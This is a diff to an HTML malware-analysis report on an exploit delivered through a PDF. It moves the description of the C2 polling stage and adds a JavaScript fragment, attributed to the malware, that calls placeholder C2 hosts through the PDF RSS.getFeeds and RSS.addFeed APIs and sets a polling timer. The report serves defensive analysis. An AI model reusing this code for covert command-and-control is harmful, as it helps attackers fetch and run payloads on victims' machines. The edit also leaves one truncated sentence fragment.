@@ -293,11 +293,7 @@
 
       <p>The exploit is triggered via a crafted button name in <code><b>ANFancyAlertImpl</b></code>, which injects and
         executes the
-        privilege escalation chain within a trusted context. After successful exploitation, the malware enters a polling
-        loop, waiting for the C2 server to deliver an AES key <code><b>bird0</b></code> and encrypted payload
-        <code><b>bird1</b></code>, which are then
-        decrypted, decompressed, and executed dynamically. This final stage enables the delivery and execution of the
-        attacker’s payload while cleaning up traces of the communication channel.
+        privilege escalation chain within a trusted context. After successful exploitation.
       </p>
 
     </div>
@@ -305,10 +301,32 @@
     <!-- Polling -->
     <div class="report-section">
       <h2>6. Continuous Polling &amp; Downloader Role</h2>
-      <p>The use of <code><b>RSS.addFeed()</b></code> and <code><b>RSS.getFeeds()</b></code> indicates an attempt to
-        leverage built-in
-        PDF networking capabilities for covert C2 communication, enabling the malware to dynamically fetch and execute
-        additional payloads without triggering standard network monitoring.</p>
+      <p>The malware enters a polling loop, waiting for the C2 server to deliver an AES key <code><b>bird0</b></code>
+        and an encrypted payload <code><b>bird1</b></code>, which are then decrypted, decompressed, and executed
+        dynamically.
+
+        This final stage enables the delivery and execution of the attacker’s payload while cleaning up traces of the
+        communication channel. Notably, the use of <code><b>RSS.addFeed()</b></code> and
+        <code><b>RSS.getFeeds()</b></code> demonstrates an abuse of built-in PDF networking capabilities for covert C2
+        communication, allowing the malware to fetch and execute additional payloads while evading standard network
+        monitoring mechanisms.
+      </p>
+      <pre class="code-block">
+            function startup(global) {
+
+    var url1 = "http://<C2_1>";
+    var url2 = "http://<C2_2>";
+
+    try { RSS.getFeeds(url1); } catch (e) {}
+    try { RSS.getFeeds(url2); } catch (e) {}
+
+    try { RSS.addFeed(url2, true); } catch (e) {}
+    try { RSS.addFeed(url1, true); } catch (e) {}
+
+    global.timer = app.setInterval(function () {
+        check(global, url1, url2);
+    }, 500);
+}</pre>
       <div class="report-img-block">
         <img src="images/adobepdf/pdf-rss-c2.png" alt="RSS.addFeed and RSS.getFeeds used for C2 polling" />
         <p class="img-caption">Figure 7: Abused PDF RSS APIs — addFeed and getFeeds used as covert C2 polling channel
